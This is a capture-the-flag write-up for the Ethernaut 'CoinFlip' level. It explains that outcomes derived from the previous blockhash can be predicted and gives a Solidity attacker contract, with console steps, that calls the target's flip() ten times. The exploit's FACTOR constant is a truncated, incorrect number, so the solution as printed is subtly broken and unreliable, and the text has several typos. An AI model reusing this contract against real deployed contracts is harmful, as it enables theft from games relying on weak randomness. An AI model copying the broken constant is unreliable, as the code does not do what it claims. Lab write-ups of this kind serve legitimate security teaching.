Level 3: CoinFlip

Objective:

You must consecutively win the coin flip 10 times in a row.

Vulnerability:

It uses blockhash of the previous block and divides it to a huge constant to decide the coutcome.
Since blockhash and factor are known the outcome can be predicted.

Explanation:

We can do the same calculations in another contract. Predict whether the result will be true or false then submit the correct guess to the flip() function.
We repeat this 10 times in a row to win.

Solution:

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface CoinFlip {
function flip(bool \_guess) external returns (bool);
}

contract CoinFlipHack {
address public target;
uint256 FACTOR = 1157920892373161954235709850086879078532699846656405640394575840079131296399;

    constructor(address _target) {
        target = _target;
    }

    function predictAndFlip() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool guess = coinFlip == 1 ? true : false;

        CoinFlip(target).flip(guess);
    }

}

put the contracts address(await contract.adrress) in \_target then call predictAndFLip() 10 times

you can check using await contract.consecutiveWins()
if it returns 10 submit the level.

Key Takeaways:

Never use blockhash for randomness as attackers might predict or manipulate it.
